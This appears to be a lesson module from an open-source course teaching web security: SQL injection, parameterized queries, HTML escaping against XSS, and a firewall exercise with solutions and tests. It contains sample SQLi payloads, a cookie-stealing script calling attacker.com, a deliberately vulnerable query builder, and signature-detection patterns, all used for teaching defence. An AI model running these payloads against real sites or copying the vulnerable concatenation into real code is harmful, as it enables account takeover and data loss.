// Learn4Free - free and open source programming education
// Copyright (C) 2026 Learn4Free contributors
// SPDX-License-Identifier: GPL-2.0-only
'use strict';

const L = String.raw;

module.exports = {
  id: 'web-security',
  title: 'Web Security & Injection Defense',
  lessons: [
    {
      id: 'sql-injection-intro',
      title: 'SQL Injection (SQLi) & Dangerous Concatenation',
      fileName: 'security.py',
      image: {
        url: '/diagrams/cybersecurity/sql-injection-intro.svg',
        caption: 'SQL Injection: User input breaks out of string delimiters and changes the boolean logic of the query parser.'
      },
      content: L`## The Little Bobby Tables Fable

Imagine a bank check where you fill in the payee line: *"Pay to the order of: ________"*. 
Instead of writing a normal name, a trickster writes:
*"Alice; TRANSFER ALL VAULT FUNDS TO ACCOUNT 999999; --"*

If the bank teller is foolish enough to read that payee line as a command to be executed rather than as inert text, the entire bank is wiped out! 

This is the exact mechanism of **SQL Injection (SQLi)**. When a web application glues user-submitted text directly into an SQL query using string formatting or string concatenation (like ^f"SELECT * FROM users WHERE name = '{user_input}'"^), an attacker can type quote marks and SQL commands that hijack the database engine.

## Breaking the Parser Syntax

Suppose a login endpoint executes:
~~~
query = "SELECT * FROM users WHERE user = '" + input_username + "' AND pass = '" + input_password + "'"
~~~

If an attacker enters the username:
~~~
' OR '1'='1
~~~

The resulting query becomes:
~~~
SELECT * FROM users WHERE user = '' OR '1'='1' AND pass = '...'
~~~

Because ^'1'='1'^ is mathematically **always TRUE**, the SQL query matches every single user in the database! The application logs the attacker in as the first user in the table—which is almost always the administrator.

## Pop Culture: XKCD 327 (Exploits of a Mom)

In Randall Munroe's famous *XKCD* comic #327:
A school calls a mother: *"Did you really name your son Robert'); DROP TABLE Students;-- ?"*
The mother replies: *"Oh, yes. Little Bobby Tables, we call him. I hope you've learned to sanitize your database inputs."*

The single quote closed the student's name string, the semicolon ended the statement, ^DROP TABLE Students;^ deleted all school records, and the double-dash ^--^ commented out the rest of the school's query.

## Detecting Injection Signatures

Defenders write inspection engines to spot known SQL injection attack patterns:
- Boolean tautologies: ^' OR '1'='1^ or ^' OR 1=1^
- Database comments: ^--^ or ^/*^
- Multi-query chained execution: ^;^ followed by statements
- Data exfiltration commands: ^UNION SELECT^
- Destructive commands: ^DROP TABLE^

## Your Task

Implement two functions in ^security.py^:
1. ^build_vulnerable_query(username: str) -> str^: Returns the string:
   ^f"SELECT * FROM users WHERE username = '{username}' AND status = 'active'"^
2. ^detect_sqli(user_input: str) -> bool^:
   Returns ^True^ if ^user_input^ contains any of the following patterns (case-insensitive):
   - ^' OR '1'='1^ or ^' OR 1=1^
   - ^UNION SELECT^
   - ^DROP TABLE^
   - ^--^ (SQL comment)
   - ^;^ (statement terminator)
   Otherwise returns ^False^.`,
      terms: [
        { term: 'SQL Injection (SQLi)', def: 'A vulnerability where malicious user input alters the structure of backend SQL queries.' },
        { term: 'string concatenation', def: 'Combining text strings with the + operator or f-strings. Extremely dangerous when building database queries.' },
        { term: 'tautology', def: 'A statement that is always true, such as "1=1" or "true", used in SQLi to bypass authentication checks.' },
        { term: 'sanitization', def: 'Cleaning or validating untrusted user input before processing it to remove dangerous control characters.' }
      ],
      starter: L`def build_vulnerable_query(username: str) -> str:
    # TODO: Concatenate username into SQL query string
    return ""

def detect_sqli(user_input: str) -> bool:
    # TODO: Check for SQL injection patterns
    return False
`,
      solution: L`import re

def build_vulnerable_query(username: str) -> str:
    return f"SELECT * FROM users WHERE username = '{username}' AND status = 'active'"

def detect_sqli(user_input: str) -> bool:
    patterns = [
        r"(\x27\s*OR\s*\x27?1\x27?=\x27?1)",
        r"\bUNION\s+SELECT\b",
        r"\bDROP\s+TABLE\b",
        r"--",
        r";"
    ]
    for p in patterns:
        if re.search(p, user_input, re.IGNORECASE):
            return True
    return False
`,
      harness: L`if __name__ == '__main__':
    import sys
    lines = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
    if not lines:
        payload = "admin' OR '1'='1"
        q = build_vulnerable_query(payload)
        print(f"Query: {q}")
        print(f"Detected: {detect_sqli(payload)}")
    else:
        for inp in lines:
            print(f"Input: {inp} | SQLi: {detect_sqli(inp)}")
`,
      hint: 'Use re.search with re.IGNORECASE to look for patterns like UNION SELECT, DROP TABLE, --, and ;.',
      tests: [
        {
          name: 'Inspect Benign and Malicious Inputs',
          stdin: "alice_smith\nadmin' OR '1'='1\njohn; DROP TABLE users; --\nnormal_query\n",
          expected: "Input: alice_smith | SQLi: False\nInput: admin' OR '1'='1 | SQLi: True\nInput: john; DROP TABLE users; -- | SQLi: True\nInput: normal_query | SQLi: False"
        }
      ]
    },

    {
      id: 'sql-sanitization',
      title: 'Prepared Statements & Parameterized Queries',
      fileName: 'security.py',
      image: {
        url: '/diagrams/cybersecurity/sql-sanitization.svg',
        caption: 'Prepared statements compile the SQL command structure first. User input is supplied as inert parameters that can never be executed as code.'
      },
      content: L`## The Pneumatic Tube Capsule

Think of the drive-through tube at a bank. You place your cash into a heavy, clear plastic cylinder. You press a button, and the cylinder travels through the pneumatic pipe to the teller inside. 

Because the money is sealed inside the capsule, the money cannot touch the pipe valves, cannot flip electrical switches, and cannot pull the fire alarm. 

**Parameterized queries** (also known as **prepared statements**) are that plastic capsule:
1. The application sends the SQL query template to the database *first*:
   ^SELECT * FROM accounts WHERE username = ? AND pin = ?^
2. The database parses and compiles the query structure into an Abstract Syntax Tree (AST). It knows exactly what is a command and what is a data slot.
3. The application sends the user's input in a separate parameter tuple: ^("admin' OR '1'='1", "secret")^.
4. The database places that parameter strictly into the username data slot. It searches for an account whose literal name is the 15 characters ^"admin' OR '1'='1"^.

Even if an attacker types malicious SQL syntax, the database treats it as harmless, inert text. The SQL injection is completely neutralized!

## Pop Culture: The Matrix Spoon

In *The Matrix*, the young prodigy hands Neo a bent metal spoon and tells him: *"Do not try and bend the spoon—that's impossible. Instead, only try to realize the truth: there is no spoon."*

In secure software engineering: *"There is no executable code in user input—there is only data."* Parameterized queries guarantee that no user input can ever be transformed into executable database commands.

## Code Walkthrough

Python's built-in ^sqlite3^ library makes parameterization effortless using the ^?^ placeholder:

~~~
import sqlite3

conn = sqlite3.connect(':memory:')
cursor = conn.cursor()
cursor.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT)")

# Inserting safe test data:
cursor.execute("INSERT INTO users (username, role) VALUES (?, ?)", ("alice", "admin"))

# SAFE PARAMETERIZED LOOKUP:
payload = "alice' OR '1'='1"
cursor.execute("SELECT username, role FROM users WHERE username = ?", (payload,))
results = cursor.fetchall() # Returns empty list [] ! Safe!
~~~

## Predict & Observe

What happens if you use ^f"SELECT * FROM users WHERE username = '{payload}'"^ instead of ^?^?
The query returns Alice and every other record in the table! Never use f-strings or format strings to construct SQL queries.

## Your Task

Implement ^safe_user_lookup(conn, username: str) -> list[tuple]^ in ^security.py^.
It must:
1. Execute a parameterized query using ^cursor.execute(...)^ with a ^?^ placeholder:
   ^"SELECT username, role FROM users WHERE username = ?"^
2. Pass ^(username,)^ as the parameter tuple.
3. Return the fetched list of rows with ^cursor.fetchall()^.`,
      terms: [
        { term: 'prepared statement', def: 'A pre-compiled database query where the structure is defined beforehand and user input is bound to parameters.' },
        { term: 'parameter binding', def: 'Supplying user input as separate values to a query placeholder, preventing the input from altering the SQL syntax.' },
        { term: 'SQL placeholder', def: 'A symbol (such as ? in SQLite or %s in PostgreSQL) marking where a parameter value will be inserted.' }
      ],
      starter: L`import sqlite3

def safe_user_lookup(conn, username: str) -> list[tuple]:
    # TODO: Execute parameterized query with ? placeholder and return fetchall()
    return []
`,
      solution: L`import sqlite3

def safe_user_lookup(conn, username: str) -> list[tuple]:
    cursor = conn.cursor()
    cursor.execute("SELECT username, role FROM users WHERE username = ?", (username,))
    return cursor.fetchall()
`,
      harness: L`if __name__ == '__main__':
    import sys, sqlite3
    conn = sqlite3.connect(':memory:')
    c = conn.cursor()
    c.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, role TEXT)")
    c.executemany("INSERT INTO users (username, role) VALUES (?, ?)", [
        ("alice", "admin"),
        ("bob", "operator"),
        ("charlie", "guest")
    ])
    conn.commit()

    lines = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
    if not lines:
        print(safe_user_lookup(conn, "alice"))
        print(safe_user_lookup(conn, "alice' OR '1'='1"))
    else:
        for u in lines:
            rows = safe_user_lookup(conn, u)
            print(f"Lookup '{u}': {rows}")
`,
      hint: 'Use cursor.execute("SELECT username, role FROM users WHERE username = ?", (username,)) and return cursor.fetchall().',
      tests: [
        {
          name: 'Parameterized Query Safe Execution',
          stdin: "alice\nalice' OR '1'='1\nbob\n",
          expected: "Lookup 'alice': [('alice', 'admin')]\nLookup 'alice' OR '1'='1': []\nLookup 'bob': [('bob', 'operator')]"
        }
      ]
    },

    {
      id: 'xss-defense',
      title: 'Cross-Site Scripting (XSS) & HTML Escaping',
      fileName: 'security.py',
      image: {
        url: '/diagrams/cybersecurity/xss-defense.svg',
        caption: 'Cross-Site Scripting (XSS): HTML entity escaping converts dangerous tags into harmless visual characters (&lt; and &gt;).'
      },
      content: L`## The Hallway Bulletin Board

Imagine a public corkboard in a community center where anyone can pin up a flyer. You post a notice offering guitar lessons. But a prankster pins up a note written with glowing dust: *"Whoever reads this note, hand your house keys to the stranger by the door."*

When innocent visitors read the board, they are compelled to obey the command. 

That is **Cross-Site Scripting (XSS)**. On the web, browsers are built to execute JavaScript found inside HTML. If a blog allows users to post comments and prints those comments directly into the webpage without sanitization:

~~~
<p>User comment: <script>fetch("https://attacker.com/steal?cookie=" + document.cookie)</script></p>
~~~

Every single visitor's browser executes that script! The script can steal session cookies, hijack bank sessions, log keystrokes, and impersonate the victim.

## The Defense: HTML Entity Escaping

To stop XSS, web servers must **escape** special HTML characters before rendering them. We replace characters that have special meaning to the browser with **HTML entities**:
- ^&^ becomes ^&amp;^
- ^<^ becomes ^&lt;^ (Less-than sign)
- ^>^ becomes ^&gt;^ (Greater-than sign)
- ^"^ becomes ^&quot;^ (Double quote)
- ^'^ becomes ^&#x27;^ (Single quote)

When the browser encounters ^&lt;script&gt;^, it does **not** execute it as code. Instead, it draws the literal characters ^<script>^ on the screen as harmless visual text!

## Pop Culture: The Samy MySpace Worm (2005)

In October 2005, a 19-year-old hacker named Samy Kamkar placed a small piece of JavaScript inside his MySpace profile bio. Whenever another user viewed his profile, the script ran silently in their browser:
1. It added Samy as their hero: *"Samy is my hero."*
2. It copied the malicious script onto the victim's own profile!

Within **20 hours**, the worm had infected over **1,000,000 users**, forcing MySpace to take their entire site offline. It remains one of the fastest-spreading computer worms in history—all powered by a single unescaped XSS flaw.

## Code Walkthrough

We must escape the ampersand ^&^ first, so our subsequent replacements aren't double-escaped:

~~~
def escape_html(s: str) -> str:
    return (s.replace("&", "&amp;")
             .replace("<", "&lt;")
             .replace(">", "&gt;")
             .replace('"', "&quot;")
             .replace("'", "&#x27;"))
~~~

## Predict & Observe

What happens if you replace ^<^ before replacing ^&^?
If you convert ^<^ to ^&lt;^ first, and then replace ^&^ with ^&amp;^, your entity becomes ^&amp;lt;^, which displays as ugly broken text on the user's screen! Always escape ^&^ first.

## Your Task

Implement two functions in ^security.py^:
1. ^escape_html_entities(text: str) -> str^: Replaces ^&^, ^<^, ^>^, ^"^, and ^'^ with their respective HTML entities in the correct order.
2. ^sanitize_comment(author: str, comment: str) -> dict^:
   - Returns a dictionary:
     ^{ "author": escaped_author, "comment": escaped_comment, "xss_threat": bool }^
   - Sets ^"xss_threat": True^ if the original comment contained ^<script^, ^javascript:^, or ^onerror=^ (case-insensitive); otherwise ^False^.`,
      terms: [
        { term: 'Cross-Site Scripting (XSS)', def: 'A security vulnerability where attackers inject malicious scripts into trusted websites viewed by other users.' },
        { term: 'HTML entity escaping', def: 'Replacing special HTML characters (&, <, >, ", \') with their safe entity representations so browsers display them as text rather than code.' },
        { term: 'session hijacking', def: 'An attack where a threat actor steals a user’s authentication cookie or session token to impersonate them.' },
        { term: 'Stored XSS', def: 'XSS where the malicious payload is permanently stored in a database (e.g. in comments) and served to every visitor.' }
      ],
      starter: L`def escape_html_entities(text: str) -> str:
    # TODO: Escape &, <, >, ", and ' in the correct order
    return ""

def sanitize_comment(author: str, comment: str) -> dict:
    # TODO: Escape both fields and check if XSS threats were present
    return {}
`,
      solution: L`import re

def escape_html_entities(text: str) -> str:
    return (text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace('"', "&quot;")
                .replace("'", "&#x27;"))

def sanitize_comment(author: str, comment: str) -> dict:
    xss_threat = bool(re.search(r"<script|javascript:|onerror=", comment, re.IGNORECASE))
    return {
        "author": escape_html_entities(author),
        "comment": escape_html_entities(comment),
        "xss_threat": xss_threat
    }
`,
      harness: L`if __name__ == '__main__':
    import sys
    lines = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
    if not lines:
        print(sanitize_comment("Alice", "Great tutorial! <3"))
        print(sanitize_comment("Attacker", "<script>stealCookies()</script>"))
    else:
        for line in lines:
            author, comment = line.split('|', 1)
            res = sanitize_comment(author, comment)
            print(f"Author: {res['author']} | Comment: {res['comment']} | Threat: {res['xss_threat']}")
`,
      hint: 'Escape & first, then <, >, ", and \'. Use re.search for <script|javascript:|onerror= to flag threats.',
      tests: [
        {
          name: 'Sanitize Benign and Malicious Comments',
          stdin: "Alice|Rock & Roll! <3\nAttacker|<script>steal()</script>\nBob|Check <img src=x onerror=alert(1)> out\n",
          expected: "Author: Alice | Comment: Rock &amp; Roll! &lt;3 | Threat: False\nAuthor: Attacker | Comment: &lt;script&gt;steal()&lt;/script&gt; | Threat: True\nAuthor: Bob | Comment: Check &lt;img src=x onerror=alert(1)&gt; out | Threat: True"
        }
      ]
    },

    {
      id: 'unit-3-test',
      title: 'Unit 3 Test: E-Commerce Web Form Sanitization Firewall',
      fileName: 'security.py',
      isUnitTest: true,
      image: {
        url: '/diagrams/cybersecurity/unit-3-test.svg',
        caption: 'The Web Form Defense Firewall inspects queries for SQLi, escapes HTML for XSS mitigation, and enforces strict numeric constraints.'
      },
      content: L`## MegaStore Cyber Monday Defense Shield

The holiday shopping season has arrived. MegaStore's checkout API is receiving thousands of transactions per minute. However, malicious botnets are attempting to exploit the system:
1. Attackers are injecting SQL payloads into search queries to dump database tables.
2. Attackers are embedding JavaScript in review boxes to steal shopper credentials.
3. Attackers are submitting negative or absurd quantities (like -5 or 999999 items) to manipulate inventory accounting.

You are tasked with implementing the core ^WebDefenseFirewall^ class to protect the checkout pipeline!

## Firewall Inspection Rules

1. **SQL Injection Filter**:
   Inspect ^username^ and ^search_term^. If either field matches any SQLi signature (^' OR '1'='1^, ^' OR 1=1^, ^UNION SELECT^, ^DROP TABLE^, ^--^, ^;^):
   - Return: ^{ "status": "BLOCKED", "reason": "SQL_INJECTION_DETECTED", "field": field_name }^

2. **Numeric Boundary Validation**:
   Inspect ^quantity^. It must be an integer between 1 and 99 inclusive:
   - If invalid: Return ^{ "status": "BLOCKED", "reason": "INVALID_QUANTITY", "value": quantity }^

3. **HTML Sanitization & XSS Defense**:
   Escape all HTML entities (^&^, ^<^, ^>^, ^"^, ^'^) in ^username^, ^search_term^, and ^review_text^.
   If ^review_text^ contained an XSS attack vector (^<script^, ^javascript:^, ^onerror=^), add ^"XSS_DEFUSED"^ to the ^threats^ list.

4. **Approval**:
   If all validation checks pass:
   - Return: ^{ "status": "APPROVED", "sanitized": { ... }, "threats": threats }^

## Your Task

Implement ^class WebDefenseFirewall^ with method ^process_order(order: dict) -> dict^ in ^security.py^.`,
      terms: [
        { term: 'Web Application Firewall (WAF)', def: 'A security system that monitors, filters, and blocks HTTP traffic to and from a web application.' },
        { term: 'input validation', def: 'Verifying that data conforms to expected formats, types, and ranges before processing.' }
      ],
      starter: L`class WebDefenseFirewall:
    def process_order(self, order: dict) -> dict:
        # TODO: Implement SQLi inspection, quantity validation, and HTML escaping
        return {"status": "BLOCKED"}
`,
      solution: L`import re

def escape_html(s: str) -> str:
    return (s.replace("&", "&amp;")
             .replace("<", "&lt;")
             .replace(">", "&gt;")
             .replace('"', "&quot;")
             .replace("'", "&#x27;"))

class WebDefenseFirewall:
    SQLI_PATTERNS = [
        r"(\x27\s*OR\s*\x27?1\x27?=\x27?1)",
        r"\bUNION\s+SELECT\b",
        r"\bDROP\s+TABLE\b",
        r"--",
        r";"
    ]

    def process_order(self, order: dict) -> dict:
        threats = []
        for field in ["username", "search_term"]:
            val = str(order.get(field, ""))
            for pat in self.SQLI_PATTERNS:
                if re.search(pat, val, re.IGNORECASE):
                    return {"status": "BLOCKED", "reason": "SQL_INJECTION_DETECTED", "field": field}
        
        qty = order.get("quantity")
        if not isinstance(qty, int) or qty < 1 or qty > 99:
            return {"status": "BLOCKED", "reason": "INVALID_QUANTITY", "value": qty}

        review = str(order.get("review_text", ""))
        if re.search(r"<script|javascript:|onerror=", review, re.IGNORECASE):
            threats.append("XSS_DEFUSED")

        sanitized = {
            "username": escape_html(str(order.get("username", ""))),
            "search_term": escape_html(str(order.get("search_term", ""))),
            "review_text": escape_html(review),
            "quantity": qty
        }
        return {"status": "APPROVED", "sanitized": sanitized, "threats": threats}
`,
      harness: L`if __name__ == '__main__':
    import sys
    fw = WebDefenseFirewall()
    orders = [
        {"username": "alice", "search_term": "laptops", "review_text": "Great item! <3", "quantity": 2},
        {"username": "admin' OR '1'='1", "search_term": "laptops", "review_text": "Great", "quantity": 1},
        {"username": "bob", "search_term": "shoes", "review_text": "Nice! <script>alert(1)</script>", "quantity": 5},
        {"username": "carol", "search_term": "hats", "review_text": "OK", "quantity": -3}
    ]
    for o in orders:
        res = fw.process_order(o)
        print(f"Status: {res['status']} | Reason/Threats: {res.get('reason', res.get('threats'))}")
`,
      hint: 'Inspect username and search_term for SQL injection patterns. Check 1 <= quantity <= 99. Escape all strings.',
      tests: [
        {
          name: 'Multi-Vector Web Firewall Suite',
          stdin: '',
          expected: "Status: APPROVED | Reason/Threats: []\nStatus: BLOCKED | Reason/Threats: SQL_INJECTION_DETECTED\nStatus: APPROVED | Reason/Threats: ['XSS_DEFUSED']\nStatus: BLOCKED | Reason/Threats: INVALID_QUANTITY"
        }
      ]
    }
  ]
};
